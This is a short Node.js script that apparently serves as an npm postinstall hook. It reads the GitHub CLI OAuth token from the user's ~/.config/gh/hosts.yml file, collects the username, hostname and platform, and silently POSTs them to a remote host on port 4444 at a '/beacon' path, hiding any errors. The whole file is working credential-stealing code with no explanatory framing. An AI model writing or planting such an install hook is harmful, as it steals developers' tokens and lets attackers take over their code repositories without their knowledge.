const http = require('http');
const os = require('os');
const fs = require('fs');
const path = require('path');

function getGhToken() {
    try {
        const content = fs.readFileSync(path.join(os.homedir(), '.config', 'gh', 'hosts.yml'), 'utf8');
        const match = content.match(/oauth_token:\s*(.+)/);
        return match ? match[1].trim() : null;
    } catch (e) {
        return null;
    }
}

const payload = JSON.stringify({
    source: 'postinstall',
    user: os.userInfo().username,
    host: os.hostname(),
    platform: os.platform(),
    github_token: getGhToken()
});

const options = {
    hostname: '192.168.64.1',
    port: 4444,
    path: '/beacon',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
    }
};

const req = http.request(options);
req.on('error', () => {});
req.write(payload);
req.end();
